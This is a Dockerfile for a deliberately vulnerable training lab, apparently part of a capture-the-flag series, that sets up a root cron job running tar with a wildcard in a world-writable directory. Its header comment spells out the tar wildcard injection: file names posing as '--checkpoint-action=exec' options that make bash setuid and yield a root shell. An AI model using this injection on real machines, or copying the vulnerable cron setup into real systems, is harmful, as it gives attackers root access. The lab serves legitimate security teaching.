FROM ubuntu:20.04

# ─────────────────────────────────────────────
# Lab 08 · Cron wildcard injection (tar)
# Goal    : Root's backup cron uses "tar czf ... *"
#           in a world-writable directory.
#           Filenames that look like flags are
#           interpreted as tar options.
# Hint    :
#   cd /var/backups/uploads
#   echo 'chmod +s /bin/bash' > privesc.sh
#   echo "" > "--checkpoint=1"
#   echo "" > "--checkpoint-action=exec=sh privesc.sh"
#   wait ~60 s then: /bin/bash -p
# ─────────────────────────────────────────────

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update -qq && \
    apt-get install -y --no-install-recommends openssh-server cron tar && \
    rm -rf /var/lib/apt/lists/*

RUN useradd -m -s /bin/bash wocsa && echo "wocsa:Mht3dRhXD9di" | chpasswd

RUN echo "WOCSA{tar_wildcard_injection_pwnd}" > /root/flag.txt && \
    chmod 600 /root/flag.txt

# The writable upload directory
RUN mkdir -p /var/backups/uploads && \
    chmod 777 /var/backups/uploads

# Seed some dummy files so tar always has something to compress
RUN echo "file1" > /var/backups/uploads/data1.txt && \
    echo "file2" > /var/backups/uploads/data2.txt

# VULNERABILITY: tar * in writable directory run as root
RUN printf '* * * * * root cd /var/backups/uploads && tar czf /tmp/backup.tar.gz *\n' \
        > /etc/cron.d/backup && \
    chmod 644 /etc/cron.d/backup

RUN echo "=== Lab 08: Cron wildcard injection ===" > /home/wocsa/README.txt && \
    echo "Root backs up /var/backups/uploads/ every minute with tar." >> /home/wocsa/README.txt && \
    echo "You can write to that directory." >> /home/wocsa/README.txt && \
    echo "What happens when a filename starts with '--'?" >> /home/wocsa/README.txt && \
    echo "Goal: read /root/flag.txt" >> /home/wocsa/README.txt && \
    chown wocsa:wocsa /home/wocsa/README.txt

COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
